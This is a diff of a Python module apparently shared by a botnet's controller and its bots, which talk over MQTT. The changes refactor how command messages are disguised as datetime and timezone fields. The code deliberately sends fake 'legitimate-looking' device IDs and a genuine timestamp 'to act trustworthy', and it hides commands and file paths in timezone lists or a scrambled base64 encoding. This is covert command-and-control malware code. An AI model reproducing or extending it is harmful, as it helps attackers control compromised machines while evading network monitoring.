@@ -1,6 +1,7 @@
 # Common code for both controller and bot
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from typing import Optional
+from datetime import datetime
 from paho.mqtt import client as mqtt
 import random
 import base64
@@ -66,24 +67,92 @@ CHAR_TO_TIMEZONE = {
     "Z": "Europe/Zurich",
     ",": "Africa/Johannesburg",
     " ": "Africa/Lagos",
+    ".": "Africa/Kenya",
 }
 
 TIMEZONE_TO_CHAR = {v.upper(): k for k, v in CHAR_TO_TIMEZONE.items()}
 
 @dataclass
 class RequestMessage:
-    local_datetime: Optional[str] = None # will send legitimate local datetime, just to act trustworthy
-    local_datetime_leap: Optional[str] = None # bot ID
-    datetime_leap: Optional[str] = None # encrypted message
-    timezones: Optional[str] = None
-    timezone: Optional[str] = None # action
+    # Will send legitimate local datetime, just to act trustworthy
+    local_datetime: str = field(default_factory=lambda: datetime.now().isoformat()) 
+
+    device_id: Optional[str] = None           # Bot ID
+    datetime_leap: Optional[str] = None       # Encrypted message
+    timezones: Optional[list[str]] = None     # Obfuscated message
+    timezone: Optional[str] = None            # User action. Only controller sends this field.
     
     @classmethod
     def from_json(cls, json_str: str):
         data = json.loads(json_str)
         return cls(**data)
+    
+    def to_json(self) -> str:
+        json_obj = {}
+        if self.local_datetime is not None:
+            json_obj["local_datetime"] = self.local_datetime
+        if self.device_id is not None:
+            json_obj["device_id"] = self.device_id
+        if self.datetime_leap is not None:
+            json_obj["datetime_leap"] = self.datetime_leap
+        if self.timezones is not None:
+            json_obj["timezones"] = self.timezones
+        if self.timezone is not None:
+            json_obj["timezone"] = self.timezone
+        return json.dumps(json_obj)
+    
+    def get_user_action(self):
+        if self.timezone is None:
+            return None
+        action_timezone = self.timezone.upper()
+        if action_timezone not in TIMEZONE_TO_ACTION:
+            # unknown timezone
+            return None
+        return TIMEZONE_TO_ACTION[action_timezone]
+    
+    def set_device_id(self, fake_device_id: str, ips: list[str]):
+        """This device ID will be sent as is. It must look legitimate."""
+        self.device_id = fake_device_id
+    
+    def get_decrypted_message(self):
+        if self.datetime_leap is not None:
+            return decrypt(self.datetime_leap)
+        return None
+    
+    def get_deobfuscated_message(self):
+        if self.timezones is not None:
+            return deobfuscate(self.timezones)
+        return None
+    
+    def set_message(self, message: str):
+        """Set message to be sent, either encrypted or obfuscated depending on length. You can set message only once."""
+        if len(message) <= 100:
+            self.timezones = obfuscate(message)
+        else:
+            self.datetime_leap = encrypt(message)
 
-def do_very_strange_encryption(text: str):
+@dataclass
+class ControllerMessage:
+    user_action: int
+    path: Optional[str] = None
+
+    @classmethod
+    def from_request(cls, request: RequestMessage):
+        if request.timezone is None:
+            raise UnknownDeviceError()
+        
+        # if no user action is presented, that means the message is not from controller
+        user_action = request.get_user_action()
+        if user_action is None:
+            raise UnknownDeviceError()
+        
+        path = request.get_decrypted_message()
+        if path is None:
+            path = request.get_deobfuscated_message()
+        
+        return cls(user_action=user_action, path=path)
+
+def encrypt(text: str):
     encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
     
     # char_to_timezone values
@@ -107,7 +176,7 @@ def do_very_strange_encryption(text: str):
     return json.dumps(result)
 
 
-def do_very_strange_decryption(encrypted_json: str):
+def decrypt(encrypted_json: str):
     data = json.loads(encrypted_json)
     
     # char_to_timezone values
@@ -145,28 +214,23 @@ def do_very_strange_decryption(encrypted_json: str):
     decoded = base64.b64decode(encoded).decode('utf-8')
     return decoded
 
-def encode_as_timezones(text: str):
-    # convert each character to its corresponding timezone
-    encoded = []
-    for char in text.upper():
+def obfuscate(message: str) -> list[str]:
+    """Convert message to list of timezones. Convert each character to its corresponding timezone"""
+    obfuscated = []
+    for char in message.upper():
         if char in CHAR_TO_TIMEZONE:
-            encoded.append(CHAR_TO_TIMEZONE[char])
+            obfuscated.append(CHAR_TO_TIMEZONE[char])
         else: # char missing in dictionary
-            encoded.append(CHAR_TO_TIMEZONE[', '])
+            obfuscated.append(CHAR_TO_TIMEZONE[' '])
+    return obfuscated
 
-def decode_as_timezones(timezones_encoded_msg):
-    # convert list of timezones back to characters
-    decoded = []
-    for tz in timezones_encoded_msg:
+def deobfuscate(obfuscated_msg: list[str]) -> str:
+    """Convert list of timezones back to message"""
+    deobfuscated = []
+    for tz in obfuscated_msg:
         if tz.upper() in TIMEZONE_TO_CHAR:
-            decoded.append(TIMEZONE_TO_CHAR[tz.upper()])
-    return ''.join(decoded)
-
-def encode(text: str):
-    if len(text) <= 100:
-        return [MSG_FIELD_TIMEZONES, encode_as_timezones(text)]
-    else:
-        return [MSG_FIELD_ENCRYPTED_MSG, do_very_strange_encryption(text)]
+            deobfuscated.append(TIMEZONE_TO_CHAR[tz.upper()])
+    return ''.join(deobfuscated)
 
 class UnknownDeviceError(Exception):
     """Message received from unknown device."""
